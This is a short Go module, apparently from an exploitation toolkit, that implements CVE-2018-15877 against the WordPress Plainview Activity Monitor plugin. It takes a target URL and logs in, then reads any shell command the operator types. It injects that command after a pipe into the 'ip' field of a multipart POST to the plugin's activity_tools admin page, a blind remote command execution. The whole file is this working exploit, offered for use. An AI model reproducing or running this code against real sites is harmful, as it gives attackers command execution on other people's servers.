package modules

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"strings"
)

//CVE201815877 ...
func CVE201815877() {
	var url string

	fmt.Printf("Url: ")
	fmt.Scanf("%s, ", &url)
	cookie := Login(url)

	var cmd string
	fmt.Printf("Essa falha é do Blind(não retorna nenhuma saida)\nCommando: ")
	scanner := bufio.NewScanner(os.Stdin)
	scanner.Scan()
	cmd = scanner.Text()

	client := new(http.Client)
	formData := strings.NewReader(`-----------------------------11111111111111111111111111111
Content-Disposition: form-data; name="ip"

google.com| ` + cmd + `
-----------------------------11111111111111111111111111111
Content-Disposition: form-data; name="lookup"

Lookup
-----------------------------11111111111111111111111111111--`)

	req, _ := http.NewRequest("POST", url+"/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools", formData)
	req.Header.Set("Content-Type", "multipart/form-data; boundary=---------------------------11111111111111111111111111111")
	req.Header.Set("Cookie", cookie)
	client.Do(req)

	fmt.Println("Finalizado...")
}
